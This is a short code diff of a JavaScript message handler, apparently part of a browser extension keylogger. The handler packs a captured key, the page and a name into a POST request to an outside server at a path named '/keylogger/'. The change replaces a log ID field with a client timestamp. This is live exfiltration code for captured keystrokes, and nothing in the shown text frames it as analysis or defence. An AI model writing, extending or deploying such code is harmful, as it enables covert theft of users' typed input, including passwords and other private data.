@@ -1,5 +1,6 @@
 function handleMessage (request) {
-	data = "key="+request.key+"&page="+request.page+"&name="+request.name+"&log_id="+request.log_id;
+    const localDateTime = new Date().toLocaleString();
+	data = "key="+request.key+"&page="+request.page+"&name="+request.name+"&client_time="+request.local_datetime;
 	console.log(request);
 	fetch("https://dev.micinproject.my.id/keylogger/", {
         method: "POST",
